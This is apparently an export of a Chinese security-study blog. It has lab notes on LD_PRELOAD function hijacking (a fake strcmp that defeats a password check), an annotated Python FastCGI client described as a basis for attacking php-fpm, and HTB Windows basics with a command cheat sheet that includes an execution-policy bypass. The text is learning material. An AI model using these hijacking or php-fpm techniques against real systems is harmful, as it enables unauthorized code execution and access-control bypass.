href="https://www.runoob.com/jsref/jsref-multiline-regexp.html">multiline</a></td><td>判断是否设置了 “m” 修饰符</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-source-regexp.html">source</a></td><td>返回正则表达式的匹配模式</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数劫持实验</title>
      <link href="/2023/06/11/Function_hijacking_experiments/"/>
      <url>/2023/06/11/Function_hijacking_experiments/</url>
      
        <content type="html"><![CDATA[<h2 id="函数劫持实验"><a href="#函数劫持实验" class="headerlink" title="函数劫持实验"></a>函数劫持实验</h2><h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><h4 id="Linux-编译动态链接库（-so）"><a href="#Linux-编译动态链接库（-so）" class="headerlink" title="Linux 编译动态链接库（.so）"></a>Linux 编译动态链接库（.so）</h4><p>参考文章：</p><p> <a href="https://blog.csdn.net/chengyq116/article/details/100567555?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167143895816782425647499%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=167143895816782425647499&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-2-100567555-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=gcc%20-shared%20-fpic%20-o&spm=1018.2226.3001.4187">GCC 生成动态链接库 .so 文件 (-shared 和 -fPIC 选项)</a></p><p><strong>gcc -shared -fpic</strong></p><blockquote><p><code>-fPIC</code> 选项作用于编译阶段，告诉编译器产生与位置无关代码 (Position-Independent Code),这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。</p></blockquote><blockquote><p>如果想创建一个动态链接库，可以使用 GCC 的 -shared 选项。输入文件可以是源文件、汇编文件或者目标文件。</p></blockquote><p>一般的编译链接命令行为：</p><p><code>gcc -fPIC -shared func.c -o libfunc.so</code></p><span id="more"></span><h4 id="readelf-lt-option-s-gt-elf-file-s"><a href="#readelf-lt-option-s-gt-elf-file-s" class="headerlink" title="readelf  &lt;option(s)&gt;  elf-file(s)"></a>readelf  &lt;option(s)&gt;  elf-file(s)</h4><p>参考：<a href="https://blog.csdn.net/tanrui519521/article/details/79868700?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167143780216800182759984%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167143780216800182759984&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-79868700-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=readelf&spm=1018.2226.3001.4187">Linux中的readelf命令</a></p><blockquote><p>关于ELF文件：</p><p>ELF文件类型：</p><p>a)可重定位文件:用户和其他目标文件一起创建可执行文件或者共享目标文件,例如lib*.a文件。</p><p>b)可执行文件：用于生成进程映像，载入内存执行,例如编译好的可执行文件a.out。</p><p>c)共享目标文件：用于和其他共享目标文件或者可重定位文件一起生成elf目标文件或者和执行文件一起创建进程映像，例如lib*.so文件。</p><p>ELF文件作用：</p><p>ELF文件参与程序的连接(建立一个程序)和程序的执行(运行一个程序)，所以可以从不同的角度来看待elf格式的文件：</p><p>a)如果用于编译和链接（可重定位文件），则编译器和链接器将把elf文件看作是节头表描述的节的集合,程序头表可选。</p><p>b)如果用于加载执行（可执行文件），则加载器则将把elf文件看作是程序头表描述的段的集合，一个段可能包含多个节，节头表可选。</p><p>c)如果是共享文件，则两者都含有。</p><p>ELF文件总体组成：</p><p>elf文件头描述elf文件的总体信息。包括： 系统相关，类型相关，加载相关，链接相关。</p></blockquote><p>-s –syms              Display the symbol table</p><p>-W –wide              Allow output width to exceed 80 characters</p><p>通过此命令可以查看动态库中包含的函数或者函数都调用了哪些库函数</p><p>###实验</p><p><a href="https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html">参考</a></p><p>先编写一个c语言文件cp.c:</p><blockquote><pre><code>#!c#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123;char passwd[] = &quot;password&quot;;if (argc &lt; 2) &#123;        printf(&quot;usage: %s &lt;password&gt;/n&quot;, argv[0]);        return;&#125;if (!strcmp(passwd, argv[1])) &#123;        printf(&quot;Correct Password!/n&quot;);        return;&#125;printf(&quot;Invalid Password!/n&quot;);&#125;</code></pre></blockquote><p>其中用到了<code>strcmp（）</code>函数</p><p>我们尝试劫持<code>strcmp()</code>函数</p><p>先构造一个新的<code>strcmp()</code>函数：</p><p>hack.c</p><blockquote><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;int strcmp(const char *s1, const char *s2)&#123;    printf(&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n&quot;, s1, s2);    return 0;&#125;</code></pre></blockquote><p>我们将hack.c编译成动态链接库</p><p><code>gcc -shared hack.c -o hack.so</code></p><p>再设置LD_PRELOAD</p><p><code>export LD_PRELOAD=&quot;./hack.so&quot;</code></p><p>当我们再执行<code>srtcmp()</code>函数时，得到</p><blockquote><p>hack function invoked. ……</p></blockquote><p>此时函数劫持成功</p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP_FPM</title>
      <link href="/2023/06/11/PHP_FPM/"/>
      <url>/2023/06/11/PHP_FPM/</url>
      
        <content type="html"><![CDATA[<p>##PHP_FPM</p><ul><li><h3 id="关于FPM"><a href="#关于FPM" class="headerlink" title="关于FPM"></a>关于FPM</h3><p>参考文章：<a href="https://juejin.cn/post/6844903471976546311">Nginx+Php-fpm 运行原理详解</a></p><span id="more"></span><ul><li><p>正向代理与反向代理：</p><blockquote><p>vpn对于“我们”来说，是可以感知到的（我们连接vpn）<br>vpn对于”google服务器”来说，是不可感知的(google只知道有http请求过来)。<br><strong>对于人来说可以感知到，但服务器感知不到的服务器，我们叫他正向代理服务器。</strong></p></blockquote><blockquote><h4 id="反向代理：通过反向代理实现负载均衡"><a href="#反向代理：通过反向代理实现负载均衡" class="headerlink" title="反向代理：通过反向代理实现负载均衡"></a>反向代理：通过反向代理实现负载均衡</h4><p>此代理服务器,对于“我们”来说是不可感知的(我们只能感知到访问的是百度的服务器，不知道中间还有代理服务器来做负载均衡)。<br>此代理服务器，对于”server1 server2 server3”是可感知的(代理服务器负载均衡路由到不同的server)<br><strong>对于人来说不可感知，但对于服务器来说是可以感知的，我们叫他反向代理服务器</strong></p></blockquote></li><li><h4 id="Nginx是什么"><a href="#Nginx是什么" class="headerlink" title="Nginx是什么"></a>Nginx是什么</h4><blockquote><p>Nginx (“engine x”) 是一个高性能的HTTP和反向代理服务器，也是一个IMAP&#x2F;POP3&#x2F;SMTP服务器。</p></blockquote></li><li><h5 id="cgi、fast-cgi协议"><a href="#cgi、fast-cgi协议" class="headerlink" title="cgi、fast-cgi协议"></a>cgi、fast-cgi协议</h5><blockquote><h6 id="cgi的历史"><a href="#cgi的历史" class="headerlink" title="cgi的历史"></a>cgi的历史</h6><p>早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。<br>webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！<br>交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？<br>&#x3D;&#x3D;为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。&#x3D;&#x3D;只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序。</p></blockquote><blockquote><h6 id="fast-cgi的改进"><a href="#fast-cgi的改进" class="headerlink" title="fast-cgi的改进"></a>fast-cgi的改进</h6><p>有了cgi协议，解决了php解释器与webserver通信的问题，webserver终于可以处理动态语言了。但是，webserver每收到一个请求，都会去fork一个cgi进程，请求结束再kill掉这个进程。这样有10000个请求，就需要fork、kill php-cgi进程10000次。</p><p>有没有发现很浪费资源？</p><p>于是，出现了cgi的改良版本，fast-cgi。fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。</p></blockquote></li><li><h5 id="php-fpm是什么"><a href="#php-fpm是什么" class="headerlink" title="php-fpm是什么"></a>php-fpm是什么</h5><blockquote><p>php-fpm即php-Fastcgi Process Manager.</p><p>php-fpm是 FastCGI 的实现，并提供了进程管理的功能。<br>进程包含 master 进程和 worker 进程两种进程。<br>master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。</p></blockquote></li></ul><pre><code>www.example.com/index.php        |        |      nginx        |        |加载nginx的fast-cgi模块        |        |fast-cgi对根据fast-cgi协议请求包进行封装，然后将封装好的包发给php-fpm        |        |php-fpm 据fast-cgi协议将TCP流解析成真正的数据,调用php文件        |        |php-fpm处理完请求，返回给nginx        |        |nginx将结果通过http返回给浏览器</code></pre></li><li><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>基本原理就是模仿nginx的fast-cgi，直接与php-fpm进行通信。在通信之前，我们首先需要了解一下其通信包的构成。</p><ul><li><p>Fastcgi协议由多个record组成，record也有header和body一说，但是和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p><pre><code>typedef struct &#123;  /* Header */  unsigned char version; // 版本  unsigned char type; // 请求包的类型  unsigned char requestIdB1; // 请求包id高8位  unsigned char requestIdB0; // 请求包id低8位  unsigned char contentLengthB1; // body长度高8位  unsigned char contentLengthB0; // body长度低8位  unsigned char paddingLength; // 结尾填充长度  unsigned char reserved;   // 保留字节  /* Body */  unsigned char contentData[contentLength];  unsigned char paddingData[paddingLength];&#125; FCGI_Record;</code></pre><p>可以看出一个请求头为8个字节。其参数解释如下： - version:用来表示版本信息，如果是web服务器给php-fpm发送的消息，请求头中只需要将其置0就可以 - type:此字段用来说明每次所发送消息的类型，其具体值可以为如下:</p><p><img src="/" alt="CGI"></p><p>-requestId:占俩个字节，一个唯一的标志id，以避免同时处理多个请求时的影响。 - contentLength:占2个字节，表示body的长度。语言端解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体。 - paddingLength:填充长度的值，为了提高处理消息的能力，我们的每个消息大小都必须为8的倍数，此长度标示，我们在消息的尾部填充的长度 - reserved:保留字段</p></li><li><h2 id="fastcgi客户端脚本分析"><a href="#fastcgi客户端脚本分析" class="headerlink" title="fastcgi客户端脚本分析"></a>fastcgi客户端脚本分析</h2><p>协议的内容大致了解了，接下来就是写代码，封装一下请求包。已经有前辈做了这件事情–&gt;<a href="https://link.zhihu.com/?target=https://github.com/wuyunfeng/Python-FastCGI-Client">https://github.com/wuyunfeng/Python-FastCGI-Client</a>，我们来尝试分析一下代码。</p><pre><code>#!/usr/bin/pythonimport socketimport random</code></pre><p>class FastCGIClient:<br>“””A Fast-CGI Client for Python”””<br><br># 版本号，不重要<br>__FCGI_VERSION &#x3D; 1<br><br># FastCGI服务器角色及其设置<br>__FCGI_ROLE_RESPONDER &#x3D; 1<br>__FCGI_ROLE_AUTHORIZER &#x3D; 2<br>__FCGI_ROLE_FILTER &#x3D; 3<br><br># # type 记录类型1-11<br>__FCGI_TYPE_BEGIN &#x3D; 1<br>__FCGI_TYPE_ABORT &#x3D; 2<br>__FCGI_TYPE_END &#x3D; 3<br>__FCGI_TYPE_PARAMS &#x3D; 4<br>__FCGI_TYPE_STDIN &#x3D; 5<br>__FCGI_TYPE_STDOUT &#x3D; 6<br>__FCGI_TYPE_STDERR &#x3D; 7<br>__FCGI_TYPE_DATA &#x3D; 8<br>__FCGI_TYPE_GETVALUES &#x3D; 9<br>__FCGI_TYPE_GETVALUES_RESULT &#x3D; 10<br>__FCGI_TYPE_UNKOWNTYPE &#x3D; 11<br><br># 头部长度，默认为8<br>__FCGI_HEADER_SIZE &#x3D; 8<br><br># 自定义请求状态<br>FCGI_STATE_SEND &#x3D; 1<br>FCGI_STATE_ERROR &#x3D; 2<br>FCGI_STATE_SUCCESS &#x3D; 3<br><br>def <strong>init</strong>(self, host, port, timeout, keepalive):<br>    self.host &#x3D; host<br>    self.port &#x3D; port<br>    self.timeout &#x3D; timeout<br>    if keepalive:<br>        self.keepalive &#x3D; 1<br>    else:<br>        self.keepalive &#x3D; 0<br>    self.sock &#x3D; None<br>    self.requests &#x3D; dict()<br><br>def __connect(self):<br>    # 此函数创建了一个socket，并且去连接(self.host, self.port)<br>    self.sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    self.sock.settimeout(self.timeout)<br>    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)<br>    try:<br>        self.sock.connect((self.host, int(self.port)))<br>    except socket.error as msg:<br>        self.sock.close()<br>        self.sock &#x3D; None<br>        print(repr(msg))<br>        return False<br>    return True<br><br>def __encodeFastCGIRecord(self, fcgi_type, content, requestid):<br>    # 此函数根据fcgi_type对content进行封装<br>    length &#x3D; len(content)<br>    return chr(FastCGIClient.__FCGI_VERSION) <br>           + chr(fcgi_type) <br>           + chr((requestid &gt;&gt; 8) &amp; 0xFF) <br>           + chr(requestid &amp; 0xFF) <br>           + chr((length &gt;&gt; 8) &amp; 0xFF) <br>           + chr(length &amp; 0xFF) <br>           + chr(0) <br>           + chr(0) <br>           + content<br><br>def __encodeNameValueParams(self, name, value):<br>    # 此函数对body进行编码<br>    nLen &#x3D; len(str(name))<br>    vLen &#x3D; len(str(value))<br>    record &#x3D; ‘’<br>    if nLen &lt; 128:<br>        record +&#x3D; chr(nLen)<br>    else:<br>        record +&#x3D; chr((nLen &gt;&gt; 24) | 0x80) <br>                  + chr((nLen &gt;&gt; 16) &amp; 0xFF) <br>                  + chr((nLen &gt;&gt; 8) &amp; 0xFF) <br>                  + chr(nLen &amp; 0xFF)<br>    if vLen &lt; 128:<br>        record +&#x3D; chr(vLen)<br>    else:<br>        record +&#x3D; chr((vLen &gt;&gt; 24) | 0x80) <br>                  + chr((vLen &gt;&gt; 16) &amp; 0xFF) <br>                  + chr((vLen &gt;&gt; 8) &amp; 0xFF) <br>                  + chr(vLen &amp; 0xFF)<br>    return record + str(name) + str(value)<br><br>def __decodeFastCGIHeader(self, stream):<br>    # 此函数对header进行解码<br>    # 被用于__decodeFastCGIRecord函数的一部分<br>    header &#x3D; dict()<br>    header[‘version’] &#x3D; ord(stream[0])<br>    header[‘type’] &#x3D; ord(stream[1])<br>    header[‘requestId’] &#x3D; (ord(stream[2]) &lt;&lt; 8) + ord(stream[3])<br>    header[‘contentLength’] &#x3D; (ord(stream[4]) &lt;&lt; 8) + ord(stream[5])<br>    header[‘paddingLength’] &#x3D; ord(stream[6])<br>    header[‘reserved’] &#x3D; ord(stream[7])<br>    return header<br><br>def __decodeFastCGIRecord(self):<br>    # 此函数对record进行解码<br>    header &#x3D; self.sock.recv(int(FastCGIClient.__FCGI_HEADER_SIZE))<br>    if not header:<br>        return False<br>    else:<br>        record &#x3D; self.__decodeFastCGIHeader(header)<br>        record[‘content’] &#x3D; ‘’<br>        if ‘contentLength’ in record.keys():<br>            contentLength &#x3D; int(record[‘contentLength’])<br>            buffer &#x3D; self.sock.recv(contentLength)<br>            while contentLength and buffer:<br>                contentLength -&#x3D; len(buffer)<br>                record[‘content’] +&#x3D; buffer<br>        if ‘paddingLength’ in record.keys():<br>            skiped &#x3D; self.sock.recv(int(record[‘paddingLength’]))<br>        return record<br><br>def request(self, nameValuePairs&#x3D;{}, post&#x3D;’’):<br>    if not self.__connect():<br>        print(‘connect failure! please check your fasctcgi-server !!’)<br>        return<br>    # 区分多段Record.requestId作为同一次请求的标志<br>    requestId &#x3D; random.randint(1, (1 &lt;&lt; 16) - 1)<br>    self.requests[requestId] &#x3D; dict()<br>    request &#x3D; “”<br>    # 构造header<br>    beginFCGIRecordContent &#x3D; chr(0) <br>                             + chr(FastCGIClient.__FCGI_ROLE_RESPONDER) <br>                             + chr(self.keepalive) <br>                             + chr(0) * 5<br>    request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                          beginFCGIRecordContent, requestId)<br><br>    # 构造body<br>    paramsRecord &#x3D; ‘’<br>    if nameValuePairs:<br>        for (name, value) in nameValuePairs.iteritems():<br>            # paramsRecord &#x3D; self.__encodeNameValueParams(name, value)<br>            # request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>            paramsRecord +&#x3D; self.__encodeNameValueParams(name, value)<br><br>    if paramsRecord:<br>        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>    request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, ‘’, requestId)<br><br>    if post:<br>        request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, post, requestId)<br>    request +&#x3D; self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, ‘’, requestId)<br>    # 发送fast-cgi格式的包<br>    self.sock.send(request)<br>    self.requests[requestId][‘state’] &#x3D; FastCGIClient.FCGI_STATE_SEND<br>    self.requests[requestId][‘response’] &#x3D; ‘’<br>    # 接受返回包<br>    return self.__waitForResponse(requestId)<br><br>def __waitForResponse(self, requestId):<br>    # 接受返回包<br>    while True:<br>        response &#x3D; self.__decodeFastCGIRecord()<br>        if not response:<br>            break<br>        if response[‘type’] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDOUT <br>                or response[‘type’] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR:<br>            if response[‘type’] &#x3D;&#x3D; FastCGIClient.__FCGI_TYPE_STDERR:<br>                self.requests[‘state’] &#x3D; FastCGIClient.FCGI_STATE_ERROR<br>            if requestId &#x3D;&#x3D; int(response[‘requestId’]):<br>                self.requests[requestId][‘response’] +&#x3D; response[‘content’]<br>        if response[‘type’] &#x3D;&#x3D; FastCGIClient.FCGI_STATE_SUCCESS:<br>            self.requests[requestId]<br>    return self.requests[requestId][‘response’]<br><br>def <strong>repr</strong>(self):<br>    return “fastcgi connect host:{} port:{}”.format(self.host, self.port)<br>​&#96;&#96;&#96;</p></li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RDP</title>
      <link href="/2023/06/11/Windows%20Services%20&amp;%20Process/"/>
      <url>/2023/06/11/Windows%20Services%20&amp;%20Process/</url>
      
        <content type="html"><![CDATA[<h4 id="远程桌面协议-（RDP）"><a href="#远程桌面协议-（RDP）" class="headerlink" title="远程桌面协议 （RDP）"></a>远程桌面协议 （RDP）</h4><p>RDP 使用客户端&#x2F;服务器体系结构，其中客户端应用程序用于通过启用了 RDP 访问的网络指定计算机的目标 IP 地址或主机名。启用了 RDP 远程访问的目标计算机被视为服务器。请务必注意，RDP 默认侦听逻辑端口。请记住，IP 地址用作网络上计算机的逻辑标识符，逻辑端口是分配给应用程序的标识符。简单来说，我们可以将网络子网视为城镇中的街道（公司网络），该子网中的 IP 地址分配给主机作为该街道上的房屋，逻辑端口视为可用于访问房屋的窗口&#x2F;门。<code>3389</code></p><span id="more"></span><p>一旦请求（封装在数据包中）通过其 IP 地址到达目标计算机，请求将根据该请求中指定的端口（作为数据包中的标头包含在内）定向到计算机上托管的应用程序。IP 寻址和协议封装在<a href="https://academy.hackthebox.com/module/details/34">网络简介</a>模块中有更详细的介绍。从网络的角度来看，在本模块中，我们只需要了解每台计算机都分配了一个 IP 地址以通过网络进行通信，而目标计算机上托管的应用程序会侦听特定的逻辑端口。</p><p>我们可以使用RDP从运行Linux或Windows的攻击主机连接到Windows目标。如果我们从Windows主机连接到Windows目标，则可以使用名为（<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc">mstsc.exe</a>）的内置RDP客户端应用程序。Remote Desktop Connection</p><p>为此，必须在目标 Windows 系统上<a href="https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-allow-access">允许</a>远程访问。默认情况下，Windows 操作系统上不允许远程访问。HTB 学院团队已将我们的许多 Windows 目标配置为允许通过 VPN 连接到学院实验室后的 RDP 访问。</p><p>远程桌面连接还允许我们保存连接配置文件。这是 IT 管理员的常见习惯，因为它使连接到远程系统更加方便。</p><p>作为渗透测试人员，我们可以在参与时查找这些保存的远程桌面文件（）中受益。<code>.rdp</code></p><p>存在许多其他远程桌面客户端应用程序，其中的一些应用程序在这篇名为<a href="https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-clients">远程桌面客户端</a>的 Microsoft 文章中列出。我们不会在本模块中介绍每个远程桌面客户端应用程序。</p><h4 id="使用-xfreerdp"><a href="#使用-xfreerdp" class="headerlink" title="使用 xfreerdp"></a>使用 xfreerdp</h4><p>从基于 Linux 的攻击主机，我们可以使用名为 <a href="https://linux.die.net/man/1/xfreerdp">xfreerdp</a> 的工具来远程访问 Windows 目标。您会注意到我们在多个模块中使用 xfreerdp，因为它易于使用、功能集、命令行实用程序和效率。</p><p>使用以下命令通过远程桌面 （RDP） 进行连接：</p><pre><code>Tanin@htb[/htb]$ xfreerdp /v:&lt;targetIp&gt; /u:htb-student /p:Password</code></pre><h1 id="Windows-Services-amp-Process"><a href="#Windows-Services-amp-Process" class="headerlink" title="Windows Services &amp; Process"></a>Windows Services &amp; Process</h1><p>服务是 Windows 操作系统的主要组件。它们允许创建和管理长时间运行的进程。Windows 服务可以在系统启动时自动启动，无需用户干预。即使用户在系统上注销其帐户，这些服务也可以继续在后台运行。</p><p>还可以创建应用程序以作为服务安装，例如安装在服务器上的网络监视应用程序。Windows 上的服务负责 Windows 操作系统中的许多功能，例如网络功能、执行系统诊断、管理用户凭据、控制 Windows 更新等。</p><p>Windows 服务通过服务控制管理器 （SCM） 系统进行管理，可通过 MMC 加载项访问。<code>services.msc</code></p><p>此外接程序提供用于与服务交互和管理服务的 GUI 界面，并显示有关每个已安装服务的信息。此信息包括服务名称、说明、状态、启动类型以及运行服务的用户。</p><p>还可以使用 <a href="https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7">PowerShell</a> cmdlet（如 ）通过命令行查询和管理服务。<code>sc.exe``Get-Service</code></p><h2 id="使用-services-msc-检查服务"><a href="#使用-services-msc-检查服务" class="headerlink" title="使用 services.msc 检查服务"></a>使用 services.msc 检查服务</h2><h2 id="使用-sc-检查服务"><a href="#使用-sc-检查服务" class="headerlink" title="使用 sc 检查服务"></a>使用 sc 检查服务</h2><h2 id="安全标识符-（SID）"><a href="#安全标识符-（SID）" class="headerlink" title="安全标识符 （SID）"></a>安全标识符 （SID）</h2><p>系统上的每个安全主体都有一个唯一的安全标识符 （SID）。系统自动生成 SID。这意味着，例如，即使我们在系统上有两个相同的用户，Windows 也可以根据其 SID 区分两者及其权限。SID 是具有不同长度的字符串值，存储在安全数据库中。这些 SID 将添加到用户的访问令牌中，以标识用户有权执行的所有操作。</p><p>SID 由标识符颁发机构和相对 ID （RID） 组成。在 Active Directory （AD） 域环境中，SID 还包括域 SID。</p><h5 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h5><p>备忘单是此模块的有用命令参考。</p><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>xfreerdp /v:&lt;target IP address&gt; /u:htb-student /p:&lt;password&gt;</code></td><td>RDP 到实验室目标</td></tr><tr><td><code>Get-WmiObject -Class win32_OperatingSystem</code></td><td>获取有关操作系统的信息</td></tr><tr><td><code>dir c:\ /a</code></td><td>查看 c：\ 中的所有文件和目录根目录</td></tr><tr><td><code>tree &lt;directory&gt;</code></td><td>以图形方式显示路径的目录结构</td></tr><tr><td>&#96;tree c:\ &#x2F;f</td><td>more&#96;</td></tr><tr><td><code>icacls &lt;directory&gt;</code></td><td>查看在目录上设置的权限</td></tr><tr><td><code>icacls c:\users /grant joe:f</code></td><td>授予用户对目录的完全权限</td></tr><tr><td><code>icacls c:\users /remove joe</code></td><td>删除用户对目录的权限</td></tr><tr><td><code>Get-Service</code></td><td><code>PowerShell</code>用于查看正在运行的服务的 cmdlet</td></tr><tr><td><code>help &lt;command&gt;</code></td><td>显示特定命令的帮助菜单</td></tr><tr><td><code>get-alias</code></td><td>列出别名<code>PowerShell</code></td></tr><tr><td><code>New-Alias -Name &quot;Show-Files&quot; Get-ChildItem</code></td><td>创建新别名<code>PowerShell</code></td></tr><tr><td>&#96;Get-Module</td><td>select Name,ExportedCommands</td></tr><tr><td><code>Get-ExecutionPolicy -List</code></td><td>查看执行策略<code>PowerShell</code></td></tr><tr><td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td><td>将当前会话的执行策略设置为绕过<code>PowerShell</code></td></tr><tr><td><code>wmic os list brief</code></td><td>获取有关操作系统的信息<code>wmic</code></td></tr><tr><td><code>Invoke-WmiMethod</code></td><td>调用对象的方法<code>WMI</code></td></tr><tr><td><code>whoami /user</code></td><td>查看当前用户的 SID</td></tr><tr><td><code>reg query &lt;key&gt;</code></td><td>查看有关注册表项的信息</td></tr><tr><td><code>Get-MpComputerStatus</code></td><td>检查启用了哪些保护设置<code>Defender</code></td></tr><tr><td><code>sconfig</code></td><td>Windows Server Core 中的“加载服务器配置”菜单</td></tr></tbody></table><h2 id="完整性控制访问控制列表-（icacls）"><a href="#完整性控制访问控制列表-（icacls）" class="headerlink" title="完整性控制访问控制列表 （icacls）"></a>完整性控制访问控制列表 （icacls）</h2><p>Integrity Control Access Control List</p><p>可以使用安全选项卡下的文件资源管理器 GUI 管理对 Windows 中文件和文件夹的 NTFS 权限。除了 GUI 之外，我们还可以使用 icacls 实用程序从命令行对 Windows 中的 NTFS 文件权限实现精细的粒度。</p><p>我们可以通过从工作目录中运行或针对当前不在的目录运行来列出特定目录上的 NTFS 权限</p><pre><code>C:\htb&gt; icacls c:\windowsc:\windows NT SERVICE\TrustedInstaller:(F)           NT SERVICE\TrustedInstaller:(CI)(IO)(F)           NT AUTHORITY\SYSTEM:(M)           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)           BUILTIN\Administrators:(M)           BUILTIN\Administrators:(OI)(CI)(IO)(F)           BUILTIN\Users:(RX)           BUILTIN\Users:(OI)(CI)(IO)(GR,GE)           CREATOR OWNER:(OI)(CI)(IO)(F)           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)Successfully processed 1 files; Failed processing 0 files</code></pre><p>资源访问级别列在输出中的每个用户之后。可能的继承设置包括：</p><ul><li><code>(CI)</code>：容器继承</li><li><code>(OI)</code>：对象继承</li><li><code>(IO)</code>：仅继承</li><li><code>(NP)</code>：不传播继承</li><li><code>(I)</code>：从父容器继承的权限</li></ul><p>在上面的示例中，该帐户具有对象继承、容器继承、仅继承和完全访问权限。这意味着此帐户可以完全控制此目录和子目录中的所有文件系统对象。<code>NT AUTHORITY\SYSTEM</code></p><p>基本访问权限如下：</p><ul><li><code>F</code>：完全访问权限</li><li><code>D</code>：删除访问权限</li><li><code>N</code>：无访问权限</li><li><code>M</code>：修改访问权限</li><li><code>RX</code>：读取和执行访问</li><li><code>R</code>：只读访问</li><li><code>W</code>：只写访问</li></ul><p>我们可以使用 .在这里，我们在本地管理员帐户的上下文中执行，该帐户显示用户没有任何写入权限的目录。<code>icacls``icacls``C:\users``joe</code></p><pre><code>C:\htb&gt; icacls c:\Usersc:\Users NT AUTHORITY\SYSTEM:(OI)(CI)(F)         BUILTIN\Administrators:(OI)(CI)(F)         BUILTIN\Users:(RX)         BUILTIN\Users:(OI)(CI)(IO)(GR,GE)         Everyone:(RX)         Everyone:(OI)(CI)(IO)(GR,GE)Successfully processed 1 files; Failed processing 0 files</code></pre><p>使用该命令，我们可以授予 joe 用户对目录的完全控制权，但鉴于该命令中不包含该目录，joe 用户将仅对文件夹拥有权限，而对用户子目录和其中包含的文件没有权限。<code>icacls c:\users /grant joe:f``(oi)``(ci)``c:\users</code></p><pre><code>C:\htb&gt; icacls c:\users /grant joe:fprocessed file: c:\usersSuccessfully processed 1 files; Failed processing 0 files</code></pre><pre><code>C:\htb&gt; &gt;icacls c:\usersc:\users WS01\joe:(F)         NT AUTHORITY\SYSTEM:(OI)(CI)(F)         BUILTIN\Administrators:(OI)(CI)(F)         BUILTIN\Users:(RX)         BUILTIN\Users:(OI)(CI)(IO)(GR,GE)         Everyone:(RX)         Everyone:(OI)(CI)(IO)(GR,GE)Successfully processed 1 files; Failed processing 0 files</code></pre><p>可以使用命令撤销这些权限。<code>icacls c:\users /remove 